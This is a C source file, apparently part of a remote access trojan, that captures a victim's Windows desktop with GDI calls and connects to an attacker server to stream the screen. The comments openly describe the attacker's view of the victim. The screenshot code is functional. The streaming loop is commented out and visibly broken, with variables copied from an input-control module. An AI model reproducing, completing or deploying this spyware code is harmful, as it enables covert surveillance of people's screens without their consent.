/*
Functions for streaming the victim's desktop to the attacker

*/

#include "utils.h"
#include "video.h"

// Global socket used to receive commands for input control
// TODO - change this to local varibale?
SOCKET videoSocket;
// Global handle used to keep track of input control thread
HANDLE videoThreadHandle;
// Global flag for if video should run
int videoStreaming = 0;

/*
Take a screenshot using the GDI API
Returns a byte buffer with the screenshot data
Returned byte buffer will need to be freed later
Pulled code from:
	https://stackoverflow.com/questions/5069104/fastest-method-of-screen-capturing-on-windows
	https://stackoverflow.com/questions/1628919/capture-screen-shot-with-mouse-cursor
	https://stackoverflow.com/questions/16112482/c-getting-rgb-from-hbitmap
TODO - add error chacking/handling for system calls
*/
BYTE* GDITakeScreenshot() {
	// create handles for device contexts
	HDC hdc = GetDC(NULL); // get the desktop device context
	HDC hDest = CreateCompatibleDC(hdc); // create a device context to use yourself

	// TODO - start loop here?

	// get the height and width of the screen
	int height = GetSystemMetrics(SM_CYVIRTUALSCREEN);
	int width = GetSystemMetrics(SM_CXVIRTUALSCREEN);

	// create a bitmap
	HBITMAP hbDesktop = CreateCompatibleBitmap(hdc, width, height);

	// use the previously created device context with the bitmap
	SelectObject(hDest, hbDesktop);

	// copy from the desktop device context to the bitmap device context
	// call this once per 'frame'
	BitBlt(hDest, 0, 0, width, height, hdc, 0, 0, SRCCOPY);

	// after the recording is done, release the desktop context you got..
	ReleaseDC(NULL, hdc);

	// draw the mouse cursor onto the image
	CURSORINFO cursor;
	cursor.cbSize = sizeof(cursor);
	GetCursorInfo(&cursor);
	ICONINFOEXA info;
	info.cbSize = sizeof(ICONINFOEXA);
	GetIconInfoExA(cursor.hCursor, &info);
	int x = cursor.ptScreenPos.x - info.xHotspot;
	int y = cursor.ptScreenPos.y - info.yHotspot;
	BITMAP bmpCursor;
	bmpCursor.bmType = 0;
	GetObject(info.hbmColor, sizeof(bmpCursor), &bmpCursor);
	DrawIconEx(hDest, x, y, cursor.hCursor, bmpCursor.bmWidth, bmpCursor.bmHeight, 0, NULL, DI_NORMAL);
	
	// copy bitmap into memory
	BITMAPINFOHEADER bmi;
	bmi.biSize = sizeof(BITMAPINFOHEADER);
	bmi.biPlanes = 1;
	bmi.biBitCount = 32;
	bmi.biWidth = width;
	bmi.biHeight = -height;
	bmi.biCompression = BI_RGB;
	bmi.biSizeImage = 0;// 3 * ScreenX * ScreenY;
	BYTE *data = (BYTE*)malloc(4 * width * height);
	GetDIBits(hDest, hbDesktop, 0, height, data, (BITMAPINFO*)&bmi, DIB_RGB_COLORS);

	// TODO - end loop here?

	// cleanup - delete all objects to prevent memory leak
	DeleteObject(hbDesktop);
	DeleteDC(hDest);

	// return buffer
	return data;
}

DWORD WINAPI videoThreadFunc(void* data) { /*
	// buffer for screenshot data
	BYTE *data;
	// make sure socket sends successfully
	int retCode;
	// main loop
	while (videoStreaming == 1) {
		data = GDITakeScreenshot();
		// get data from the socket and check the return value
		retCode = recv(inputSocket, buffer, 4096, 0);
		if (retCode == 0) { // connection closed
			printf("Input control socket closed...\n");
			break;
		}
		else if (retCode < 0) { // there was a socket error
			printf("Input control recv failed with error: %d\n", WSAGetLastError());
			break;
		}
		// if we got this far, we have a valid message to process
		sendInputStream(buffer);
	}
	// reset mouseControlled and keyboardControlled in case we broke out of the loop from an error
	mouseControlled = 0;
	keyboardControlled = 0;
	// try closing the socket
	if (closesocket(inputSocket) == SOCKET_ERROR) {
		printf("Error closing input control socket: %d\n", WSAGetLastError());
	}*/
	// return 0 cuz why not
	return 0;
}

/*
Connect to the attacker server and start the video stream thread
Does nothing if a connection is already established and the thread is already running
Expects no arguments
Returns nothing
TODO - return codes based on success, THREAD_ACTIVE, or error?
*/
void startVideoThread() {
	// make sure that either the video stream is toggled on
	if (videoStreaming == 0) {
		return;
	}
	// check if the input control thread is running
	DWORD exitCode = STILL_ACTIVE + 1; // default to exitCode != STILL_ACTIVE
	if (videoThreadHandle != NULL) {
		if (!GetExitCodeThread(videoThreadHandle, &exitCode)) {
			printf("Error checking input control thread's status: %d\n", GetLastError());
			videoStreaming = 0; // reset mouse and keyboard control
			return; // return to avoid creating more problems
		}
	}
	// don't go further if the thread is already running
	if (exitCode == STILL_ACTIVE) {
		return;
	}
	// try connecting to the attacker server
	if (connectToTCP(SERVER_ADDR, SERVER_VIDEO_PORT, &videoSocket)) {
		videoStreaming = 0; // reset video streaming
		return; // return to avoid creating more problems
	}
	// start the input control thread
	videoThreadHandle = CreateThread(NULL, 0, videoThreadFunc, NULL, 0, NULL);
}

/*
Toggles the attacker's view of victim desktop
If toggling on and not already connected to the attacker server,
	this will connect to the attacker server and start the video stream thread
Expects an argument of 0 or 1 to disable or enable video stream, respectively
Returns nothing
*/
void toggleVideoStream(int toggle) {
	videoStreaming = toggle;
	if (toggle == 1) {
		startVideoThread();
	}
}